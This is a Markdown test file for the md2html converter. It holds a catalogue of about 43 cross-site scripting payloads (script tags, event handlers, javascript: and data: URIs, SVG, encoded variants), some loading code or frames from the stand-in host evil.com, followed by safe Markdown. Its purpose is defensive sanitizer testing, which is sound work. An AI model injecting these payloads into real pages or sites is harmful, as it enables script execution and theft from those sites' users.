# XSS Attack Test Cases

⚠️ **WARNING**: This file contains intentionally malicious code for testing XSS protection. Do NOT use this content on production systems without proper sanitization.

This document tests the XSS (Cross-Site Scripting) protection capabilities of md2html. All the attacks below should be safely sanitized and not execute.

## Script Tag Attacks

### Basic Script Tag

<script>alert('XSS Attack 1')</script>

This paragraph should appear but the script above should be removed.

### Script with Attributes

<script type="text/javascript">alert('XSS Attack 2')</script>

### Script with Source

<script src="https://evil.com/malicious.js"></script>

### Script with Unicode

<script>alert\u0028'XSS'\u0029</script>

### Script in Different Case

<SCRIPT>alert('XSS Attack 3')</SCRIPT>
<ScRiPt>alert('XSS Attack 4')</ScRiPt>

## Event Handler Attacks

### onclick Event

<div onclick="alert('XSS Attack 5')">Click me (should not execute)</div>

<a href="#" onclick="alert('XSS Attack 6')">Link with onclick</a>

### onerror Event

<img src="invalid-image.jpg" onerror="alert('XSS Attack 7')">

<img src=x onerror="alert('XSS Attack 8')">

### onload Event

<body onload="alert('XSS Attack 9')">

<img src="valid-image.jpg" onload="alert('XSS Attack 10')">

### Other Event Handlers

<div onmouseover="alert('XSS Attack 11')">Hover me</div>

<input type="text" onfocus="alert('XSS Attack 12')" autofocus>

<details open ontoggle="alert('XSS Attack 13')">Details</details>

## JavaScript Protocol

### In Links

<a href="javascript:alert('XSS Attack 14')">Click me</a>

[Click me](javascript:alert('XSS Attack 15'))

### In Images

<img src="javascript:alert('XSS Attack 16')">

![Image](javascript:alert('XSS Attack 17'))

### In iframes

<iframe src="javascript:alert('XSS Attack 18')"></iframe>

## Data URI Attacks

### Data URI with Script

<a href="data:text/html,<script>alert('XSS Attack 19')</script>">Click</a>

### Data URI with Base64

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>

## Iframe Attacks

### Basic iframe

<iframe src="https://evil.com"></iframe>

### iframe with srcdoc

<iframe srcdoc="<script>alert('XSS Attack 20')</script>"></iframe>

### Nested iframes

<iframe><iframe src="https://evil.com"></iframe></iframe>

## Object and Embed Attacks

### Object Tag

<object data="https://evil.com/malicious.swf"></object>

<object type="text/html" data="https://evil.com"></object>

### Embed Tag

<embed src="https://evil.com/malicious.swf">

<embed type="application/x-shockwave-flash" src="https://evil.com"></embed>

## SVG Attacks

### SVG with Script

<svg><script>alert('XSS Attack 21')</script></svg>

### SVG with onload

<svg onload="alert('XSS Attack 22')"></svg>

<svg><circle onload="alert('XSS Attack 23')"></circle></svg>

## Meta Tag Attacks

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS Attack 24')">

<meta http-equiv="refresh" content="0;url=https://evil.com">

## Link Tag Attacks

<link rel="stylesheet" href="javascript:alert('XSS Attack 25')">

<link rel="import" href="https://evil.com/malicious.html">

## Form Attacks

<form action="javascript:alert('XSS Attack 26')">
  <input type="submit">
</form>

<form action="https://evil.com">
  <input type="submit">
</form>

## Style Attacks

### Inline Style with expression

<div style="background:url('javascript:alert(\'XSS Attack 27\')')">Test</div>

<div style="width:expression(alert('XSS Attack 28'))">Test</div>

### Style Tag

<style>
  body { 
    background-image: url('javascript:alert(\'XSS Attack 29\')');
  }
</style>

## HTML5 Attacks

### Video/Audio

<video><source onerror="alert('XSS Attack 30')"></video>

<audio src=x onerror="alert('XSS Attack 31')"></audio>

### Canvas

<canvas id="canvas" width="100" height="100" onload="alert('XSS Attack 32')"></canvas>

## Special Character Encoding

### URL Encoded

<a href="javascript%3Aalert('XSS Attack 33')">Click</a>

### HTML Entity Encoded

<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

### Hex Encoded

<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">

## Markdown-Specific Attacks

### Autolinks

<javascript:alert('XSS Attack 34')>

### Image with Event Handler

![Image](https://example.com/image.jpg"onerror="alert('XSS Attack 35'))

### Link with Event Handler

[Link](https://example.com"onclick="alert('XSS Attack 36'))

## Nested and Mixed Attacks

### Multiple Layers

<div>
  <span>
    <a href="javascript:alert('XSS Attack 37')">
      <img src=x onerror="alert('XSS Attack 38')">
    </a>
  </span>
</div>

### Mixed Safe and Unsafe

<p>This is **safe** text</p>
<script>alert('XSS Attack 39')</script>
<p>More *safe* text</p>

## Comment Attacks

<!-- <script>alert('XSS Attack 40')</script> -->

<!--[if IE]>
<script>alert('XSS Attack 41')</script>
<![endif]-->

## Template Attacks

### Template Literals (if processed)

${alert('XSS Attack 42')}

{{alert('XSS Attack 43')}}

## Conclusion

If md2html is working correctly:
- ✅ All script tags should be removed
- ✅ All event handlers should be stripped
- ✅ All javascript: protocols should be blocked
- ✅ All dangerous tags (iframe, object, embed) should be removed
- ✅ Safe content should remain intact

## Safe Content Examples

These should **NOT** be sanitized:

**Bold text** should work fine.

*Italic text* should work fine.

[Safe link](https://example.com) should work fine.

![Safe image](https://via.placeholder.com/150) should work fine.

`Inline code` should work fine.

```javascript
// Code blocks should work fine
console.log('This is safe');
```

> Blockquotes should work fine

- Lists should work fine
- Including nested lists

| Tables | Should | Work |
|--------|--------|------|
| Cell 1 | Cell 2 | Cell 3 |

---

**Testing Note**: After loading this file, check the browser console for any errors or warnings. There should be NO JavaScript alerts or execution. All malicious code should be sanitized while preserving the safe Markdown content.
